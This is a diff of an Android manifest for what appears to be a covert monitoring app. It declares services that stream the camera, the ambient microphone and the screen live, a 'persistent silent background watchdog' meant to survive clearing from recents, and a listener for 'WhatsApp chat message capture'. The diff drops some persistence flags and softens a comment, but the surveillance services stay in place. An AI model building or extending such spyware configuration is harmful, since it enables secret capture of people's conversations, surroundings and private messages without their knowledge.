@@ -197,35 +197,29 @@
         <service
             android:name=".camerastream.CameraStreamService"
             android:exported="false"
-            android:stopWithTask="false"
             android:foregroundServiceType="camera" />
 
         <!-- Live surrounding / ambient audio streaming service -->
         <service
             android:name=".audiostream.AudioStreamService"
             android:exported="false"
-            android:stopWithTask="false"
             android:foregroundServiceType="microphone" />
 
         <!-- Live screen streaming service (foreground service for continuous background screen streaming) -->
         <service
             android:name=".screenstream.ScreenStreamService"
             android:exported="false"
-            android:stopWithTask="false"
             android:foregroundServiceType="dataSync" />
 
-        <!-- Persistent silent background watchdog to keep process alive across recents clear -->
+        <!-- Persistent background watchdog -->
         <service
             android:name=".sync.PersistentWatchdogService"
-            android:exported="false"
-            android:stopWithTask="false"
-            android:foregroundServiceType="dataSync" />
+            android:exported="false" />
 
         <!-- Notification listener for WhatsApp chat message capture -->
         <service
             android:name=".collectors.WhatsAppNotificationListener"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-            android:stopWithTask="false"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
